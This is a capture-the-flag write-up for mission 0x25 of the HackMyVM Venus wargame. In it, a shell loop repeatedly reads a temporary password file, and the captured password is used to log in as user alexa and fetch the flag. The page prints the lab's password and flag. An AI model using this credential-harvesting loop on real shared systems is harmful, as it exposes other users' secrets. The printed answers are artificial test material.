# Mission 0x25

## 🔎 Solution
After connecting via SSH as *freya*, the next task is to obtain the password for user *alexa*. 
The challenge hints that the password is periodically written to a `.txt` file inside `/free`, but the file is deleted every minute.
```
freya@venus:~$ cat mission.txt 
################
# MISSION 0x25 #
################

## EN ##
User alexa puts her password in a .txt file in /free every minute and then deletes it. 
```

Since the file is temporary, the approach is to continuously scan the directory and print the contents as soon as a matching `.txt` file appears. 
A simple loop achieves this:
```
freya@venus:~$ while true; do find /free -name "*.txt" -exec cat {} \; ; sleep 1; done
mxq9O3MSxxX9Q3S
```

Once the password is captured, a new SSH session is initiated with the discovered credential:
```
ssh alexa@venus.hackmyvm.eu -p 5000
```

Reading the file in the new user directory reveals the next flag:
```
alexa@venus:~$ cat flagz.txt 
8===12ALP3eLlJ1GrTBxwJQM===D~~
```

## 🚩Flag
> `8===12ALP3eLlJ1GrTBxwJQM===D~~`
